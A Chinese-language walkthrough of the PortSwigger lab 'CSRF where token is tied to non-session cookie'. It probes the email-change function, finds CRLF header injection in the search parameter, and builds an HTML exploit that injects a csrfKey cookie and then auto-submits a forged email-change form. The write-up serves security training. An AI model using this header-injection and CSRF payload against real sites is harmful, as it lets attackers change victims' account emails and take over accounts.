# 实验：Token 与非会话 Cookie 绑定的 CSRF 漏洞

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie

本实验的邮箱修改功能易受 CSRF 攻击。它使用 Token 来试图防止 CSRF 攻击，但这些 Token 并未完全集成到网站的会话处理系统中。

为了解决本实验，请使用你的漏洞利用服务器（exploit server）托管一个 HTML 页面，该页面利用 CSRF 攻击修改查看者的邮箱地址。

你在该应用程序上有两个账户可用于辅助设计攻击。凭据如下：

*   `wiener:peter`
*   `carlos:montoya`

> **提示**
> 你无法注册已被其他用户使用的邮箱地址。如果在测试利用程序时更改了自己的邮箱地址，请确保在向受害者交付最终利用程序时使用另一个不同的邮箱地址。

## 步骤

⚠⚠ lab 配置有误 ⚠⚠
⚠ wiener 使用 carlos 的 csrf 令牌可成功，carlos 使用 wiener 的令牌则失败 ⚠
- 两个账户的 cookie 均为 samesite none
    - wiener 在 GET 的 cookie 头部注入时，将发送会话 cookie，并收到响应的注入令牌
        - 修改邮件时正确应用注入的令牌
    - carlos 的相同操作并不发送会话 cookie，收到注入令牌与未验证会话 cookie
        - 修改邮件时并不使用注入的令牌
- 观察到有时 wiener 与 carlos 使用相同的 csrf cookie 令牌

邮件功能探测
- 使用邮件修改功能
    ```http
    POST /my-account/change-email HTTP/2
    Cookie: csrfKey=NL08pwwL0caO4Sv2UbFgCL64z0nVpX0t; session=CWBWOfNkHwSeShJOcSxTG6kU9ZLGvnMB

    email=a%40b&csrf=9f3Q3urbqqNVL5MCSux72hbjrVGvip0s
    ```
    - 存在 csrf 令牌
        - 头部 cookie 字段
        - post 请求体参数

- 重复提交
    - csrf 令牌可重复使用
- 尝试分别移除两种 csrf 令牌
    - 均失败
- 尝试复制其中一种到另一种
    - 均失败

- 登录 carlos 账户进行双账户测试
    - wiener 使用 carlos 的 post 体参数 csrf 令牌 
        - 失败
    - wiener 使用 carlos 的头部 cookie csrf 令牌 
        - 失败
    - wiener 使用 carlos 的两种 csrf 令牌
        - 成功
- 即，此处的双重 csrf 令牌与用户会话无关，若可设置两种 csrf 令牌则可成功进行 csrf 攻击

cookie 设置探测
- 使用搜索功能
    ```http
    GET /?search=`!"#$%&'()* ,-./:;<=>?@[]^_`{}|~\\ HTTP/2
    ```

    - 服务器响应

        ```http
        Set-Cookie: LastSearchTerm=`!"#$%&'()*+,-./:;<=>?@[]^_`{}|~\\; Secure; HttpOnly
        ```
        - 服务器将搜索内容反射到 Set-Cookie 字段
            - 符号未编码
- 尝试注入头部
    ```http
    GET /?search=bbbbbbbbbbbbbb%0d%0aSet-Cookie:%20foo=bar HTTP/2
    ```
    - 此处尝试添加 `%0d%0a` 回车换行以在新行设置新头部 `Set-Cookie`（由于设置 cookie 限制为每行一个）
        - 单独的 `%0a` 无效


    - 响应
        ```http
        Set-Cookie: LastSearchTerm=bbbbbbbbbbbbbb
        Set-Cookie: foo=bar; Secure; HttpOnly
        ```

攻击
- 构造头部注入的 `Set-Cookie` 载荷
    ```html
    <img src="https://lab-id.web-security-academy.net/?search=foo%0d%0aSet-Cookie: csrfKey=NL08pwwL0caO4Sv2UbFgCL64z0nVpX0t; SameSite=None" onerror="document.forms[0].submit();">
    ```
    - 任意自动 get 请求设置 cookie
    - `SameSite=None` 解除cookie跨域限制（默认 lax 限制下，post 不携带 cookie）

- 构造 post csrf 载荷，使用 burp csrf poc 构造
    ```html
    <html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
        <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="a&#64;b" />
        <input type="hidden" name="csrf" value="9f3Q3urbqqNVL5MCSux72hbjrVGvip0s" />
        <input type="submit" value="Submit request" />
        </form>
        <script>
        history.pushState('', '', '/');
        document.forms[0].submit();
        </script>
    </body>
    </html>
    ```
- 结合两部分构造最终载荷，在 img 的 get 发送后再进行表单 post

    ```html
    <html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
        <img src="https://lab-id.web-security-academy.net/?search=foo%0d%0aSet-Cookie: csrfKey=NL08pwwL0caO4Sv2UbFgCL64z0nVpX0t; SameSite=None" onerror="document.forms[0].submit();">
        <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="cccc&#64;b" />
        <input type="hidden" name="csrf" value="9f3Q3urbqqNVL5MCSux72hbjrVGvip0s" />
        <input type="submit" value="Submit request" />
        </form>
    </body>
    </html>
    ```
